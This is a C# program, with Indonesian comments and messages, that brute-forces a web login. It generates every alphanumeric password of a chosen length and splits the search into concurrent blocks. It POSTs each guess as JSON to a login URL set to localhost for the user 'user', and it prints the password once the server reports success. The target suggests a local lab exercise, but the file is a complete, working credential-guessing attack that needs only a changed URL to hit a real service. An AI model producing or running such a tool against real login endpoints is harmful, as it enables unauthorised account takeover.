
using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Collections.Concurrent;

class BruteForcePerLength {
    static string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    static string username = "user";
    static string loginUrl = "http://localhost:5500/login";
    static volatile bool found = false;
    static object lockObj = new object();

    static long TotalCombinations(int length) => (long)Math.Pow(charset.Length, length);

    static string FromIndex(long idx, int length) {
        char[] pwd = new char[length];
        for (int i = length - 1; i >= 0; i--) {
            pwd[i] = charset[(int)(idx % charset.Length)];
            idx /= charset.Length;
        }
        return new string(pwd);
    }

    static async Task<bool> TestPasswordAsync(string password, int blockId) {
        using (var client = new HttpClient()) {
            var payload = $"{{\"username\":\"{username}\",\"password\":\"{password}\"}}";
            var content = new StringContent(payload, Encoding.UTF8, "application/json");
            try {
                var response = await client.PostAsync(loginUrl, content);
                var result = await response.Content.ReadAsStringAsync();
                if (response.IsSuccessStatusCode && result.Contains("\"success\":true")) {
                    lock (lockObj) {
                        Console.WriteLine($"\n[Block-{blockId}] SUKSES! Username: {username}, Password: {password}\n");
                    }
                    found = true;
                    return true;
                }
            } catch { }
            return false;
        }
    }

    static async Task Worker(long start, long end, int length, int blockId) {
        for (long idx = start; idx < end && !found; idx++) {
            string password = FromIndex(idx, length);
            lock (lockObj) {
                Console.WriteLine($"[Block-{blockId}] Trying: {password}");
            }
            if (await TestPasswordAsync(password, blockId)) break;
        }
    }

    static async Task Main(string[] args) {
        // Ambil argumen dari command line
        if (args.Length < 2) {
            Console.WriteLine("Usage: dotnet run -- length blocks\nContoh: dotnet run -- 4 16");
            return;
        }
        int length = int.Parse(args[0]);
        int nBlocks = int.Parse(args[1]);
        long totalCombo = TotalCombinations(length);
        long blockSize = totalCombo / nBlocks;
        Task[] tasks = new Task[nBlocks];

        Console.WriteLine($"PASSWORD LENGTH: {length}, TOTAL COMBOS: {totalCombo}, BLOCKS: {nBlocks}, BLOCKSIZE: {blockSize}");
        for (int i = 0; i < nBlocks; i++) {
            long start = i * blockSize;
            long end = (i == nBlocks - 1) ? totalCombo : (i + 1) * blockSize;
            int blockId = i + 1;
            tasks[i] = Worker(start, end, length, blockId);
        }
        await Task.WhenAll(tasks);
        if (!found)
            Console.WriteLine("Selesai. Tidak ditemukan di blok ini.");
    }
}
